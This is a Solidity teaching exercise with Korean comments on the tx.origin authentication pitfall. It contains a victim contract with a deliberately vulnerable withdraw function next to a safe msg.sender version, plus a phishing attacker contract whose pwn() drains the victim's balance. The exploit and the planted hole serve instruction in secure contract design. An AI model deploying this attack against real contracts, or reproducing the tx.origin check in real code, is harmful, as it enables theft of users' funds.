// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title TxOriginVictim / TxOriginAttacker
 * @dev Ch16 실습 — tx.origin 함정
 *
 * ❌ 취약점: tx.origin으로 인증하면 피싱 컨트랙트를 통해 우회 가능
 * ✅ 방어: msg.sender 사용
 */
contract TxOriginVictim {
    address public owner;
    uint256 public balance;

    constructor() {
        owner = msg.sender;
    }

    // ❌ 취약: tx.origin은 EOA를 반환. 공격 컨트랙트를 owner가 호출하면 owner로 오인
    function badWithdraw(address payable to, uint256 amount) external {
        require(tx.origin == owner, "not owner");
        (bool ok, ) = to.call{value: amount}("");
        require(ok, "transfer failed");
        balance -= amount;
    }

    // ✅ 안전: msg.sender는 직전 호출자. 공격 컨트랙트가 호출하면 owner가 아님
    function goodWithdraw(address payable to, uint256 amount) external {
        require(msg.sender == owner, "not owner");
        (bool ok, ) = to.call{value: amount}("");
        require(ok, "transfer failed");
        balance -= amount;
    }

    receive() external payable {
        balance += msg.value;
    }
}

// ── 피싱 공격 컨트랙트 ─────────────────────────────
contract TxOriginAttacker {
    TxOriginVictim public victim;
    address payable public attacker;

    constructor(address _victim) {
        victim = TxOriginVictim(payable(_victim));
        attacker = payable(msg.sender);
    }

    /**
     * @dev owner가 이 함수를 호출하도록 유도(피싱):
     *      "무료 에어드롭 받기" 같은 미끼로 owner를 낚음
     *      실행 시 victim.badWithdraw가 tx.origin=owner로 통과됨
     */
    function pwn() external {
        victim.badWithdraw(attacker, address(victim).balance);
    }
}
